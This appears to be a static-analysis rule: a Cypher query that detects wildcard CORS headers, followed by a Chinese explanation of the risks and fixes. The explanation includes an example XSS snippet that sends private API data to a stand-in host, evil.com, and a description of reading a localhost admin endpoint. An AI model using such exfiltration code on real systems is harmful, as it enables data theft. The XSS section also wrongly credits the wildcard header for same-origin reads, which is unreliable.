// 两个常量值 流向同一个sinkNode resp.setHeader("Access-Control-Allow-Origin", "*");
// 新增约束：常量节点到sinkNode的路径最多2步
MATCH
  (a:StringLiteral {name: '\"Access-Control-Allow-Origin\"'})-[*0..2]->(sinkNode)<-[*0..2]-(b:StringLiteral {name: '\"*\"'})
RETURN
  sinkNode AS path
/*
Chanzi-Separator

任意地址 CORS

`resp.setHeader("Access-Control-Allow-Origin", "*");` 这行代码单独出现时，**风险大小完全取决于 “接口里到底放了什么数据、是否要求登录态、是否会产生副作用”**。

------------------------------------------------
1. 技术层面：这行代码到底做了什么
------------------------------------------------
- 浏览器收到响应后，会把 `Access-Control-Allow-Origin: *` 解析成：
  “任何网站都可以通过 XMLHttpRequest / fetch 读取本次响应的内容”。
- 但 不会 自动带上用户的 Cookie/Authorization（规范禁止 `*` 与
  `Access-Control-Allow-Credentials: true` 同时出现）。
- 所以：
  – 对公开、无需登录的 GET 接口，理论上只是“允许任意前端脚本读取”，风险有限；
  – 对需要登录态或会产生写操作的接口，则额外引入 CSRF / 数据泄露 的风险。

------------------------------------------------
2. 无登录态场景的剩余风险
------------------------------------------------
2.1 公开数据被第三方直接爬取或外链
攻击者在自己的前端页面里：

```javascript
fetch('https://api.example.com/v1/public/data')
  .then(r => r.json())
  .then(d => console.table(d));
```

用户只要打开攻击者网页，浏览器就会把完整 JSON 拉到攻击者前端，无需任何后端反爬。
如果接口本来就有速率限制、IP 白名单、签名等防护，这种“浏览器端直采”会让这些防护基本失效。

2.2 内网/本地服务暴露
很多开发或内部系统默认绑在 `localhost:8080`、`192.168.x.x` 上。
攻击者诱导用户访问恶意网页，页面里的 JS 就能直接 `fetch('http://localhost:8080/admin/config')`，把内网配置全读出来。
真实案例：
- 2018 年某 CI 系统把 `Access-Control-Allow-Origin: *` 加在本地 Web UI，导致恶意网站可读取构建密钥。
- VS Code Web 版早期因同样问题泄露本地文件列表（CVE-2020-1192）。

------------------------------------------------
3. 需要登录态场景的叠加风险
------------------------------------------------
虽然 `*` 本身禁止前端带 Cookie，但仍有两种绕过路径：

3.1 传统 CSRF（不依赖 CORS，但 CORS 让防御更困难）
攻击者用 `<form>` / `<img>` 等传统标签发起 POST/GET 请求，浏览器**会自动带 Cookie**。
如果业务接口没有 CSRF Token，攻击者就能以受害者身份完成转账、发消息等操作。
此时 `Access-Control-Allow-Origin: *` 并未阻止 CSRF，反而让开发者误以为“只要不读响应就安全”，从而放松对 CSRF 的防护。

3.2 配合 XSS 打通“读”能力
假设站点某处存在 XSS，攻击者先注入脚本，再在同一页面内调用 API：

```javascript
// 已在同域 XSS 下执行，浏览器会自动带 Cookie
fetch('/api/private/balance')
  .then(r => r.json())
  .then(d => fetch('https://evil.com/steal?data=' + btoa(JSON.stringify(d))));
```

因为响应头里有 `Access-Control-Allow-Origin: *`，浏览器允许前端脚本直接读取敏感 JSON，无需再绕过 Same-Origin Policy。

------------------------------------------------
4. 综合结论与修复建议
------------------------------------------------
| 接口类型 | 风险等级 | 建议 |
|----------|----------|------|
| 公开只读 JSON（天气、汇率） | ★☆☆ 低 | 可接受，但最好加 `Cache-Control` 防爬 |
| 需登录的读接口 | ★★★ 高 | **必须改成白名单域名** 或 加 `SameSite=Lax` Cookie |
| 会产生写操作 | ★★★ 高 | **必须加 CSRF Token** 或 `SameSite=Strict` Cookie |

Chanzi-Separator

修复原则
------------------------------------------------
1. 最小权限：永远只允许**明确可信**的域名。
2. 绝不反射 Origin：不要把请求头里的 `Origin` 直接写回响应。
3. 凭证分离：若必须带 Cookie，则 `Access-Control-Allow-Origin` **不能是 `*`**（浏览器规范硬性禁止，否则会报 CORS 错误）。
4. 纵深防御：CORS 只是第一道门，仍需 CSRF Token、SameSite Cookie、HTTPS、权限校验等多层保护 。

------------------------------------------------
修复方案与示例
------------------------------------------------
1. Java/Spring Boot（官方推荐做法）

```java
@Configuration
public class CorsConfig {
    @Bean
    public WebMvcConfigurer corsConfigurer() {
        return new WebMvcConfigurer() {
            @Override
            public void addCorsMappings(CorsRegistry registry) {
                registry.addMapping("/api/**")
                        .allowedOrigins("https://app.example.com",
                                        "https://admin.example.com")
                        .allowedMethods("GET", "POST")
                        .allowCredentials(true)          // 只有指定域名可带 Cookie
                        .maxAge(3600);
            }
        };
    }
}
```
要点
- `allowedOrigins` 使用**精确域名**数组，拒绝通配符 。
- 若域名较多，可用 `allowedOriginPatterns("https://*.example.com")` 支持二级域通配，但一定加白名单校验函数 。

2. 手写 Servlet Filter（无框架时）

```java
Set<String> ALLOW = Set.of("https://app.example.com");
String origin = request.getHeader("Origin");
if (ALLOW.contains(origin)) {
    response.setHeader("Access-Control-Allow-Origin", origin);
    response.setHeader("Access-Control-Allow-Credentials", "true");
}
```

3. 前端配合（可选但强烈建议）
- Cookie 设置 `SameSite=Lax`（或 `Strict`），阻断传统 CSRF。
- 敏感操作再加一次性 CSRF Token 或二次密码验证。

一句话总结

`Access-Control-Allow-Origin: *` 把“谁能读”的大门开到最大；
生产环境请改用 **白名单域名 + 最小权限 + 纵深防御**，否则“数据泄露 + CSRF + 内网暴露”三大风险随时可能落地。

Chanzi-Separator
*/